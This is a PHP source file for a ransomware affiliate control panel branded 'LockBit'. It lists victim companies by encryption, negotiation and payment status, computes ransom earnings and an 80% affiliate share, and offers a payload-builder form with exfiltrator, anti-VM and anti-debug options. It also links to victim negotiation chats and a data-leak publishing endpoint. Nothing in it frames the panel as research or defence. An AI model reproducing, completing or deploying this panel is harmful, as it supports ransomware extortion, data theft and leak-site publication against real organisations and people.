<?php
session_start();

if (!isset($_SESSION['affiliate_id'])) {
    header('Location: index.php');
    exit;
}

require_once 'config/database.php';

// Fetch affiliate stats
$stmt = $db->prepare("SELECT * FROM affiliates WHERE id = ?");
$stmt->execute([$_SESSION['affiliate_id']]);
$affiliate = $stmt->fetch(PDO::FETCH_ASSOC);

// Fetch victim statistics
$stmt = $db->prepare("SELECT COUNT(*) as total, 
                      SUM(CASE WHEN status = 'encrypted' THEN 1 ELSE 0 END) as encrypted,
                      SUM(CASE WHEN status = 'negotiating' THEN 1 ELSE 0 END) as negotiating,
                      SUM(CASE WHEN status = 'paid' THEN 1 ELSE 0 END) as paid
                      FROM victims WHERE affiliate_id = ?");
$stmt->execute([$_SESSION['affiliate_id']]);
$stats = $stmt->fetch(PDO::FETCH_ASSOC);

// Fetch recent victims
$stmt = $db->prepare("SELECT * FROM victims WHERE affiliate_id = ? ORDER BY created_at DESC LIMIT 10");
$stmt->execute([$_SESSION['affiliate_id']]);
$recentVictims = $stmt->fetchAll(PDO::FETCH_ASSOC);

// Calculate earnings
$stmt = $db->prepare("SELECT SUM(ransom_amount) as total_paid FROM victims WHERE affiliate_id = ? AND status = 'paid'");
$stmt->execute([$_SESSION['affiliate_id']]);
$earnings = $stmt->fetchColumn();

$affiliateShare = $earnings * 0.80; // 80% affiliate share

?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>LockBit Affiliate Dashboard</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { background: #0a0a0a; color: #00ff00; font-family: 'Courier New', monospace; }
        .header { background: #111; padding: 20px; border-bottom: 2px solid #00ff00; display: flex; justify-content: space-between; align-items: center; }
        .header h1 { color: #ff0000; }
        .nav { display: flex; gap: 20px; }
        .nav a { color: #00ff00; text-decoration: none; }
        .container { max-width: 1400px; margin: 0 auto; padding: 20px; }
        .stats { display: grid; grid-template-columns: repeat(4, 1fr); gap: 20px; margin-bottom: 30px; }
        .stat-box { background: #111; border: 1px solid #333; padding: 20px; border-radius: 5px; text-align: center; }
        .stat-box h3 { color: #ff0000; font-size: 32px; }
        .stat-box p { color: #666; margin-top: 10px; }
        .table-container { background: #111; border: 1px solid #333; padding: 20px; border-radius: 5px; }
        table { width: 100%; border-collapse: collapse; }
        th, td { padding: 12px; text-align: left; border-bottom: 1px solid #222; }
        th { color: #ff0000; }
        .status-encrypted { color: #ffff00; }
        .status-negotiating { color: #ff8800; }
        .status-paid { color: #00ff00; }
        .status-leaked { color: #ff0000; }
        .builder-section { background: #111; border: 1px solid #333; padding: 20px; margin-top: 20px; border-radius: 5px; }
        .btn { background: #ff0000; color: #fff; padding: 10px 20px; border: none; cursor: pointer; font-family: 'Courier New', monospace; }
        .btn:hover { background: #cc0000; }
        .wallet-info { background: #1a1a1a; padding: 15px; border-radius: 5px; margin-top: 20px; }
    </style>
</head>
<body>
    <div class="header">
        <h1>🦹 LOCKBIT AFFILIATE PANEL</h1>
        <div class="nav">
            <a href="dashboard.php">Dashboard</a>
            <a href="victims_manager.php">Victims</a>
            <a href="chat_system.php">Chat</a>
            <a href="leak_manager.php">Leak Site</a>
            <a href="payment_tracker.php">Payments</a>
            <a href="?logout=1">Logout</a>
        </div>
    </div>
    
    <div class="container">
        <div class="stats">
            <div class="stat-box">
                <h3><?php echo $stats['total']; ?></h3>
                <p>Total Victims</p>
            </div>
            <div class="stat-box">
                <h3><?php echo $stats['encrypted']; ?></h3>
                <p>Encrypted</p>
            </div>
            <div class="stat-box">
                <h3><?php echo $stats['negotiating']; ?></h3>
                <p>Negotiating</p>
            </div>
            <div class="stat-box">
                <h3><?php echo $stats['paid']; ?></h3>
                <p>Paid</p>
            </div>
        </div>
        
        <div class="wallet-info">
            <h2>💰 Your Earnings</h2>
            <p>Total Ransoms: <strong>$<?php echo number_format($earnings, 2); ?></strong></p>
            <p>Your Share (80%): <strong>$<?php echo number_format($affiliateShare, 2); ?></strong></p>
            <p>Wallet Address: <strong><?php echo htmlspecialchars($affiliate['btc_wallet']); ?></strong></p>
        </div>
        
        <div class="builder-section">
            <h2>🔧 LockBit Builder</h2>
            <p>Generate your custom payload:</p>
            <form action="api/builder_api.php" method="POST">
                <select name="platform" style="background:#222;color:#00ff00;border:1px solid #333;padding:10px;margin:10px 0;">
                    <option value="windows">Windows x64</option>
                    <option value="windows_x86">Windows x86</option>
                    <option value="linux">Linux</option>
                    <option value="esxi">VMware ESXi</option>
                    <option value="combined">Combined (All Platforms)</option>
                </select><br>
                <input type="checkbox" name="include_stealbit" checked> Include StealBit Exfiltrator<br>
                <input type="checkbox" name="anti_vm" checked> Anti-VM Protection<br>
                <input type="checkbox" name="anti_debug" checked> Anti-Debug Protection<br>
                <input type="text" name="campaign_name" placeholder="Campaign Name" style="background:#222;color:#00ff00;border:1px solid #333;padding:10px;width:100%;margin:10px 0;"><br>
                <input type="text" name="ransom_note_text" placeholder="Custom Ransom Note Text (optional)" style="background:#222;color:#00ff00;border:1px solid #333;padding:10px;width:100%;margin:10px 0;"><br>
                <button type="submit" class="btn">BUILD PAYLOAD</button>
            </form>
        </div>
        
        <div class="table-container" style="margin-top: 20px;">
            <h2>📋 Recent Victims</h2>
            <table>
                <thead>
                    <tr>
                        <th>ID</th>
                        <th>Company</th>
                        <th>Status</th>
                        <th>Ransom</th>
                        <th>Deadline</th>
                        <th>Actions</th>
                    </tr>
                </thead>
                <tbody>
                    <?php foreach ($recentVictims as $victim): ?>
                    <tr>
                        <td><?php echo htmlspecialchars($victim['id']); ?></td>
                        <td><?php echo htmlspecialchars($victim['company_name']); ?></td>
                        <td class="status-<?php echo $victim['status']; ?>">
                            <?php echo strtoupper($victim['status']); ?>
                        </td>
                        <td>$<?php echo number_format($victim['ransom_amount'], 2); ?></td>
                        <td><?php echo date('Y-m-d H:i', strtotime($victim['deadline'])); ?></td>
                        <td>
                            <a href="chat_system.php?victim_id=<?php echo $victim['id']; ?>" class="btn">Chat</a>
                            <?php if ($victim['status'] == 'encrypted'): ?>
                            <a href="api/leak_publish.php?victim_id=<?php echo $victim['id']; ?>" class="btn">Leak</a>
                            <?php endif; ?>
                        </td>
                    </tr>
                    <?php endforeach; ?>
                </tbody>
            </table>
        </div>
    </div>
</body>
</html>
